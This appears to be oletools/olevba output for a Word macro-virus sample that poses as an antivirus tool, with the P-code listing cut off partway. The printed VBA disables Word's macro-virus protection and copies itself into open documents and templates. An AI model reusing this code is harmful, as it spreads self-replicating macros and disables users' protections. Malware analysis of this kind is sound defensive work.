olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Jishe.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Jishe.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JiShenhua.bas 
in file: ./Virus.MSWord.Jishe.c - OLE stream: 'Macros/VBA/JiShenhua'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Version 1.0
'ÕâÊÇ±¾ÈËÑ§Ï°ÖÆ×÷µÄÒ»¸öºê²¡¶¾·ÀÉ±³ÌÐò,Ëü¿ÉÒÔ·ÀÖ¹²¿·ÖWORDºê²¡¶¾µÄ¸ÐÈ¾
'ÕâÐèÒªÓÐ´óÁ¿µÄºê²¡¶¾ÌØÕ÷Âë×÷ÎªÒÀ¾Ý,Èç¹ûÄã·¢ÏÖÓÐ±¾ÒßÃçÎÞÄÜÎªÁ¦µÄºê²¡¶¾
'¸ÐÐ»Äú¼°Ê±ÓëÎÒÁªÏµ,ÄãÒ²¿ÉÒÔ×ÔÑ¡ÐÞ¸Ä±¾³ÌÐò,ÒÔ¼ÓÇ¿±¾ÒßÃçµÄ¹¦Á¦
'Óë²¡¶¾×÷¶·Õù¾ÍÈçÍ¬µÖÓùÉç»á·¸×ï,ÐèÒª´ó¼ÒµÄ¹²Í¬Å¬Á¦
'»¶Ó­¼ÓÈëÆäÖÐ²¢³ÉÎªÒ»ÃûÕ½Ê¿,Ò²ÐíÄãÕýÊÇ´ó¼ÒÆÚ´ýÒÑ¾ÃµÄÓÂÊ¿
'
'³ÌÐòÉè¼Æ: ¼½É÷»ª
'°ì¹«µç»°:
'ÒÁÃÃµØÖ·: club@263.net
'
Sub AutoOpen()
    Dim file$
    Dim i As Integer
    Dim already, HasVirus As Boolean
    Dim LinesofCode As Long
    Dim answer As String
    Dim myDoc As Document
    Dim myTemp As Template
    
    answer = "MyMacroVirusKillerV1.0"
    
    'µ±Ç°´ò¿ªÄ£°åÎÄ¼þÃû
    file$ = WordBasic.[MacroFileName$]()
    
    '¹Ø±Õºê²¡¶¾±£»¤
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
    '¼ì²é´ò¿ªµÄÎÄµµÖÐÊÇ·ñÓÐ²¡¶¾
    HasVirus = False
    If (Documents.Count <> 0) Then
        For Each myDoc In Documents
            If (myDoc.VBProject.Protection = 0) Then
                For Each xitem In myDoc.VBProject.VBComponents
                    If (xitem.Name = "ThisDocument") Then
                        '´Ë²¿·ÖÓÐ´úÂëÊ±£¬Èç¹ûÕÒ²»µ½±¾Ä£¿é±êÖ¾ÔòÈÏ¶¨Îª²¡¶¾
                        LinesofCode = xitem.CodeModule.countoflines
                        If (LinesofCode > 0) And (Not HasVirus) Then
                            HasVirus = Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)
                        End If
                    ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                        'ÎÄµµÖÐ³ý±¾Ä£¿é´úÂëÖ®Íâ£¬Èç¹û»¹ÓÐÆäËü´úÂëÔòÈÏ¶¨Îª²¡¶¾
                        HasVirus = True
                    End If
                Next
            End If
        Next
    End If
    '¼ì²éÎÄµµÄ£°åÖÐÊÇ·ñÓÐ²¡¶¾
    If Not HasVirus Then
        For Each myTemp In Templates
            If (myTemp.VBProject.Protection = 0) Then
                For Each xitem In myTemp.VBProject.VBComponents
                    If (xitem.Name = "ThisDocument") Then
                        '´Ë²¿·ÖÓÐ´úÂëÊ±£¬Èç¹ûÕÒ²»µ½±¾Ä£¿é±êÖ¾ÔòÈÏ¶¨Îª²¡¶¾
                        LinesofCode = xitem.CodeModule.countoflines
                        If (LinesofCode > 0) And (Not HasVirus) Then
                            HasVirus = Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)
                        End If
                    ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                        'ÎÄµµÖÐ³ý±¾Ä£¿é´úÂëÖ®Íâ£¬Èç¹û»¹ÓÐÆäËü´úÂëÔòÈÏ¶¨Îª²¡¶¾
                        HasVirus = True
                    End If
                Next
            End If
        Next
    End If
    If HasVirus Then 'Èç¹ûÓÐ²¡¶¾£¬ÏòÓÃ»§Ìá³ö±¨¸æ
        Load VirusReport
        VirusReport.Show
    End If
    'Ïò´ò¿ªµÄÎÄµµÖÐÐ´Èë±¾´úÂë
    If (Documents.Count <> 0) Then
        For Each myDoc In Documents
            '¼ì²éÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾Ä£¿é´úÂë
            already = False
            If (myDoc.FullName = file$) Then
                already = True
            ElseIf (myDoc.VBProject.Protection = 0) Then
                For Each xitem In myDoc.VBProject.VBComponents
                    If (xitem.Name = "JiShenhua") And (xitem.Name <> "VirusReport") Then
                        already = True
                    End If
                Next xitem
            End If
            If (Not already) And (myDoc.VBProject.Protection = 0) Then
                WordBasic.MacroCopy file$ + ":JiShenhua", myDoc.FullName + ":JiShenhua"
                WordBasic.MacroCopy file$ + ":VirusReport", myDoc.FullName + ":VirusReport"
            End If
        Next
    End If
    'ÏòWORDÄ£°åÖÐÐ´Èë±¾´úÂë
    For Each myTemp In Templates
            '¼ì²éÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾Ä£¿é´úÂë
            already = False
            If (myTemp.FullName = file$) Then
                already = True
            ElseIf (myTemp.VBProject.Protection = 0) Then
                For Each xitem In myTemp.VBProject.VBComponents
                    If (xitem.Name = "JiShenhua") Then
                        already = True
                    End If
                Next xitem
            End If
            If (Not already) And (myTemp.VBProject.Protection = 0) Then
                WordBasic.MacroCopy file$ + ":JiShenhua", myTemp.FullName + ":JiShenhua"
                WordBasic.MacroCopy file$ + ":VirusReport", myTemp.FullName + ":VirusReport"
            End If
    Next
End Sub
Sub AutoNew()
    Dim file$
    Dim already, HasVirus As Boolean
    Dim LinesofCode As Long
    Dim answer As String
    Dim myDoc As Document
    
    answer = "FreeAntiWordMacroVirus"  '±¾²¡¶¾ÒßÃçÌØÕ÷Âë
    
    'µ±Ç°´ò¿ªÄ£°åÎÄ¼þÃû
    file$ = WordBasic.[MacroFileName$]()
    
    '¹Ø±Õºê²¡¶¾±£»¤
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
    'ÏòÐÂ½¨µÄÎÄµµÖÐÐ´Èë±¾´úÂë
    If (Documents.Count <> 0) Then
        For Each myDoc In Documents
            '¼ì²éÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾Ä£¿é´úÂë
            already = False
            If (myDoc.FullName = file$) Then
                already = True
            ElseIf (myDoc.VBProject.Protection = 0) Then
                For Each xitem In myDoc.VBProject.VBComponents
                    If (xitem.Name = "JiShenhua") Then
                        already = True
                    End If
                Next xitem
            End If
            If (Not already) And (myDoc.VBProject.Protection = 0) Then
                WordBasic.MacroCopy file$ + ":JiShenhua", myDoc.FullName + ":JiShenhua"
                WordBasic.MacroCopy file$ + ":VirusReport", myDoc.FullName + ":VirusReport"
            End If
        Next myDoc
    End If
End Sub
Sub AutoExit()
'¹Ø±ÕWORDÖ®Ç°ÇåÀíautoexec.dotÎÄ¼þÖÐµÄ²¡¶¾
Dim LinesofCode As Long
Dim myDoc As Document
Dim FileName As String

'Çå³ý´ò¿ªÎÄµµÖÐµÄ²¡¶¾´úÂë
If (UCase(Dir("c:\Autoexec.dot")) = "AUTOEXEC.DOT") Then
    WordBasic.DisableAutoMacros
    Documents.Open FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
    For Each myDoc In Word.Documents
        If (UCase(myDoc.Name) = "AUTOEXEC.DOT") And (myDoc.VBProject.Protection = 0) Then
            For Each xitem In myDoc.VBProject.VBComponents
                If (xitem.Name = "ThisDocument") Then
                    LinesofCode = xitem.CodeModule.countoflines
                    If LinesofCode > 0 Then
                        xitem.CodeModule.DeleteLines 1, LinesofCode
                    End If
                ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                    myDoc.VBProject.VBComponents.Remove (xitem)
                End If
            Next
            myDoc.Save
            myDoc.Close
        End If
    Next
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VirusReport.frm 
in file: ./Virus.MSWord.Jishe.c - OLE stream: 'Macros/VBA/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




































'³õÊ¼»¯´°Ìå£¬Éè¶¨´°Ìå²ÎÊý
Private Sub UserForm_Initialize()
CheckBox1.Value = True
If Documents.Count <> 0 Then
    Information.Value = ActiveDocument.FullName
End If
Beep
End Sub
Private Sub CommandButtonNothing_Click()
'¹Ø±Õ´°Ìå£¬²»×÷ÈÎºÎ´¦Àí
Dim ret As Integer
ret = MsgBox("Áìµ¼£¬ËäÈ»Äã¿ÉÄÜ»áÅúÆÀÎÒ£¬µ«»¹ÊÇÒª¸æËßÄã£¬ÕâÑù×öÊÇºÜÎ£ÏÕµÄ¡£ÊÇ·ñÕæµÃ²»×ö´¦Àí£¬ÇëÖ¸Ê¾¡£", vbYesNo + vbDefaultButton2, "ÔÙ´Î±¨¸æ£¡")
If ret = vbYes Then
    Unload VirusReport
End If
End Sub
Private Sub CommandButtonOpenVisubasic_Click()
'´ò¿ªVisulBasic±à¼­Æ÷
    ShowVisualBasicEditor = True
End Sub
Private Sub CommandButtonDetail_Click()
'±¨¸æ²¡¶¾µÄÏêÏ¸Çé¿ö
Dim answer As String
Dim myStr As String
Dim myDoc As Document
Dim myTemp As Template

answer = "MyMacroVirusKillerV1.0"
myStr = ""
For Each myTemp In Word.Templates
    If (myTemp.VBProject.Protection = 0) Then
        For Each xitem In myTemp.VBProject.VBComponents
            If (xitem.Name = "ThisDocument") Then
                LinesofCode = xitem.CodeModule.countoflines
                If LinesofCode > 0 Then
                    If (Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)) Then
                        myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐ¿ÉÄÜÓÐ²¡¶¾¡£" + Chr(10)
                        If (xitem.CodeModule.Find("Document_Open", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Open¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("Document_Close", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Close¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("Document_New", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_New¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("insertlines", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äInsertLines¡£" + Chr(10)
                        End If
                    End If
                End If
            ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿é¿ÉÄÜÊÇ²¡¶¾¡£" + Chr(10)
                If (xitem.CodeModule.Find("MacroCopy", 1, 1, 1 + LinesofCode, 1)) Then
                    myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äMacroCopy¡£" + Chr(10)
                End If
            End If
        Next
    End If
Next
For Each myDoc In Word.Documents
    If (myDoc.VBProject.Protection = 0) Then
        For Each xitem In myDoc.VBProject.VBComponents
            If (xitem.Name = "ThisDocument") Then
                LinesofCode = xitem.CodeModule.countoflines
                If LinesofCode > 0 Then
                    If (Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)) Then
                        myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐ¿ÉÄÜÓÐ²¡¶¾¡£" + Chr(10)
                        If (xitem.CodeModule.Find("Document_Open", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Open¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("Document_Close", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Close¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("Document_New", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_New¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("insertlines", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äInsertLines¡£" + Chr(10)
                        End If
                    End If
                End If
            ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿é¿ÉÄÜÊÇ²¡¶¾¡£" + Chr(10)
                If (xitem.CodeModule.Find("MacroCopy", 1, 1, 1 + LinesofCode, 1)) Then
                    myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äMacroCopy¡£" + Chr(10)
                End If
            End If
        Next
    End If
Next
Information.Value = myStr
End Sub
Private Sub CommandButtonKill_Click()
'É±²¡¶¾
Dim LinesofCode As Long
Dim myDoc As Document
Dim myTemp As Template
Dim answer As String

answer = "MyMacroVirusKillerV1.0"
'Çå³ýAutoexec.dotÖÐµÄ²¡¶¾
If (UCase(Dir("c:\Autoexec.dot")) = "AUTOEXEC.DOT") Then
    WordBasic.DisableAutoMacros
    Documents.Open FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
    Set myDoc = ActiveDocument
    If (myDoc.VBProject.Protection = 0) Then
        For Each xitem In myDoc.VBProject.VBComponents
            If (xitem.Name = "ThisDocument") Then
                LinesofCode = xitem.CodeModule.countoflines
                If LinesofCode > 0 Then
                    If (Not xitem.CodeModule.Find(answer, star, 1, star + LinesofCode, 1)) Then
                        xitem.CodeModule.DeleteLines 1, LinesofCode
                    End If
                End If
            ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                myDoc.VBProject.VBComponents.Remove (xitem)
            End If
        Next
        myDoc.Save
        myDoc.Close
    End If
End If
'Çå³ý´ò¿ªÎÄµµÖÐµÄ²¡¶¾´úÂë
For Each myDoc In Word.Documents
    If (myDoc.VBProject.Protection = 0) Then
        For Each xitem In myDoc.VBProject.VBComponents
            If (xitem.Name = "ThisDocument") Then
                LinesofCode = xitem.CodeModule.countoflines
                If LinesofCode > 0 Then
                    If (Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)) Then
                        xitem.CodeModule.DeleteLines 1, LinesofCode
                    End If
                End If
            ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                myDoc.VBProject.VBComponents.Remove (xitem)
            End If
        Next
    End If
Next
'Çå³ýWORDÄ£°åÖÐµÄ²¡¶¾´úÂë
For Each myTemp In Word.Templates
    If (myTemp.VBProject.Protection = 0) Then
        For Each xitem In myTemp.VBProject.VBComponents
            If (xitem.Name = "ThisDocument") Then
                LinesofCode = xitem.CodeModule.countoflines
                If LinesofCode > 0 Then
                    If (Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)) Then
                        xitem.CodeModule.DeleteLines 1, LinesofCode
                    End If
                End If
            ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                myTemp.VBProject.VBComponents.Remove (xitem)
            End If
        Next
    End If
Next
Unload VirusReport
MsgBox "°´ÕÕÄúµÄÖ¸Ê¾£¬ÎÒÒÑ¾­°Ñ»³ÒÉÊÇ²¡¶¾µÄ¶«¶«È«²¿ÇåÀíÍê±Ï£¬ ²»¹ýÒ²¿ÉÄÜºÃÐÄ°ìÁË»µÊÂ£¬ÄÇ¿É²»Òª¹ÖÎÒÓ´¡£", vbOKOnly, "¼½É÷»ªÏòÄú±¨¸æ£º"
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Jishe.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/JiShenhua - 10046 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000B "Version 1.0"
' Line #1:
' 	QuoteRem 0x0000 0x0043 "ÕâÊÇ±¾ÈËÑ§Ï°ÖÆ×÷µÄÒ»¸öºê²¡¶¾·ÀÉ±³ÌÐò,Ëü¿ÉÒÔ·ÀÖ¹²¿·ÖWORDºê²¡¶¾µÄ¸ÐÈ¾"
' Line #2:
' 	QuoteRem 0x0000 0x0045 "ÕâÐèÒªÓÐ´óÁ¿µÄºê²¡¶¾ÌØÕ÷Âë×÷ÎªÒÀ¾Ý,Èç¹ûÄã·¢ÏÖÓÐ±¾ÒßÃçÎÞÄÜÎªÁ¦µÄºê²¡¶¾"
' Line #3:
' 	QuoteRem 0x0000 0x003C "¸ÐÐ»Äú¼°Ê±ÓëÎÒÁªÏµ,ÄãÒ²¿ÉÒÔ×ÔÑ¡ÐÞ¸Ä±¾³ÌÐò,ÒÔ¼ÓÇ¿±¾ÒßÃçµÄ¹¦Á¦"
' Line #4:
' 	QuoteRem 0x0000 0x0031 "Óë²¡¶¾×÷¶·Õù¾ÍÈçÍ¬µÖÓùÉç»á·¸×ï,ÐèÒª´ó¼ÒµÄ¹²Í¬Å¬Á¦"
' Line #5:
' 	QuoteRem 0x0000 0x0037 "»¶Ó­¼ÓÈëÆäÖÐ²¢³ÉÎªÒ»ÃûÕ½Ê¿,Ò²ÐíÄãÕýÊÇ´ó¼ÒÆÚ´ýÒÑ¾ÃµÄÓÂÊ¿"
' Line #6:
' 	QuoteRem 0x0000 0x0000 ""
' Line #7:
' 	QuoteRem 0x0000 0x0010 "³ÌÐòÉè¼Æ: ¼½É÷»ª"
' Line #8:
' 	QuoteRem 0x0000 0x0009 "°ì¹«µç»°:"
' Line #9:
' 	QuoteRem 0x0000 0x0016 "ÒÁÃÃµØÖ·: club@263.net"
' Line #10:
' 	QuoteRem 0x0000 0x0000 ""
' Line #11:
' 	FuncDefn (Sub AutoOpen())
' Line #12:
' 	Dim 
' 	VarDefn file
' Line #13:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #14:
' 	Dim 
' 	VarDefn already
' 	VarDefn HasVirus (As Boolean)
' Line #15:
' 	Dim 
' 	VarDefn LinesofCode (As Long)
' Line #16:
' 	Dim 
' 	VarDefn answer (As String)
' Line #17:
' 	Dim 
' 	VarDefn myDoc
' Line #18:
' 	Dim 
' 	VarDefn myTemp (As Template)
' Line #19:
' Line #20:
' 	LitStr 0x0016 "MyMacroVirusKillerV1.0"
' 	St answer 
' Line #21:
' Line #22:
' 	QuoteRem 0x0004 0x0012 "µ±Ç°´ò¿ªÄ£°åÎÄ¼þÃû"
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0000 
' 	St file$ 
' Line #24:
' Line #25:
' 	QuoteRem 0x0004 0x000E "¹Ø±Õºê²¡¶¾±£»¤"
' Line #26:
' 	Ld Options 
' 	MemLd VirusProtection 
' 	IfBlock 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #28:
' 	EndIfBlock 
' Line #29:
' Line #30:
' 	QuoteRem 0x0004 0x001A "¼ì²é´ò¿ªµÄÎÄµµÖÐÊÇ·ñÓÐ²¡¶¾"
' Line #31:
' 	LitVarSpecial (False)
' 	St HasVirus 
' Line #32:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #33:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #34:
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #36:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #37:
' 	QuoteRem 0x0018 0x0030 "´Ë²¿·ÖÓÐ´úÂëÊ±£¬Èç¹ûÕÒ²»µ½±¾Ä£¿é±êÖ¾ÔòÈÏ¶¨Îª²¡¶¾"
' Line #38:
' 	Ld xitem 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St LinesofCode 
' Line #39:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld HasVirus 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #40:
' 	Ld answer 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	St HasVirus 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x0009 "JiShenhua"
' 	Ne 
' 	Paren 
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000B "VirusReport"
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #43:
' 	QuoteRem 0x0018 0x0034 "ÎÄµµÖÐ³ý±¾Ä£¿é´úÂëÖ®Íâ£¬Èç¹û»¹ÓÐÆäËü´úÂëÔòÈÏ¶¨Îª²¡¶¾"
' Line #44:
' 	LitVarSpecial (True)
' 	St HasVirus 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	StartForVariable 
' 	Next 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	StartForVariable 
' 	Next 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	QuoteRem 0x0004 0x0018 "¼ì²éÎÄµµÄ£°åÖÐÊÇ·ñÓÐ²¡¶¾"
' Line #51:
' 	Ld HasVirus 
' 	Not 
' 	IfBlock 
' Line #52:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #53:
' 	Ld myTemp 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #54:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld myTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #55:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #56:
' 	QuoteRem 0x0018 0x0030 "´Ë²¿·ÖÓÐ´úÂëÊ±£¬Èç¹ûÕÒ²»µ½±¾Ä£¿é±êÖ¾ÔòÈÏ¶¨Îª²¡¶¾"
' Line #57:
' 	Ld xitem 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St LinesofCode 
' Line #58:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld HasVirus 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #59:
' 	Ld answer 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	St HasVirus 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x0009 "JiShenhua"
' 	Ne 
' 	Paren 
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000B "VirusReport"
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #62:
' 	QuoteRem 0x0018 0x0034 "ÎÄµµÖÐ³ý±¾Ä£¿é´úÂëÖ®Íâ£¬Èç¹û»¹ÓÐÆäËü´úÂëÔòÈÏ¶¨Îª²¡¶¾"
' Line #63:
' 	LitVarSpecial (True)
' 	St HasVirus 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	StartForVariable 
' 	Next 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	StartForVariable 
' 	Next 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	Ld HasVirus 
' 	IfBlock 
' 	QuoteRem 0x0015 0x001A "Èç¹ûÓÐ²¡¶¾£¬ÏòÓÃ»§Ìá³ö±¨¸æ"
' Line #70:
' 	Ld VirusReport 
' 	ArgsCall Local 0x0001 
' Line #71:
' 	Ld VirusReport 
' 	ArgsMemCall Show 0x0000 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	QuoteRem 0x0004 0x0018 "Ïò´ò¿ªµÄÎÄµµÖÐÐ´Èë±¾´úÂë"
' Line #74:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #75:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #76:
' 	QuoteRem 0x000C 0x001E "¼ì²éÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾Ä£¿é´úÂë"
' Line #77:
' 	LitVarSpecial (False)
' 	St already 
' Line #78:
' 	Ld myDoc 
' 	MemLd FullName 
' 	Ld file$ 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #79:
' 	LitVarSpecial (True)
' 	St already 
' Line #80:
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #81:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #82:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x0009 "JiShenhua"
' 	Eq 
' 	Paren 
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000B "VirusReport"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #83:
' 	LitVarSpecial (True)
' 	St already 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	NextVar 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Ld already 
' 	Not 
' 	Paren 
' 	Ld myDoc 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #88:
' 	Ld file$ 
' 	LitStr 0x000A ":JiShenhua"
' 	Add 
' 	Ld myDoc 
' 	MemLd FullName 
' 	LitStr 0x000A ":JiShenhua"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #89:
' 	Ld file$ 
' 	LitStr 0x000C ":VirusReport"
' 	Add 
' 	Ld myDoc 
' 	MemLd FullName 
' 	LitStr 0x000C ":VirusReport"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	StartForVariable 
' 	Next 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	QuoteRem 0x0004 0x0016 "ÏòWORDÄ£°åÖÐÐ´Èë±¾´úÂë"
' Line #94:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #95:
' 	QuoteRem 0x000C 0x001E "¼ì²éÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾Ä£¿é´úÂë"
' Line #96:
' 	LitVarSpecial (False)
' 	St already 
' Line #97:
' 	Ld myTemp 
' 	MemLd FullName 
' 	Ld file$ 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #98:
' 	LitVarSpecial (True)
' 	St already 
' Line #99:
' 	Ld myTemp 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #100:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld myTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #101:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x0009 "JiShenhua"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #102:
' 	LitVarSpecial (True)
' 	St already 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	StartForVariable 
' 	Ld xitem 
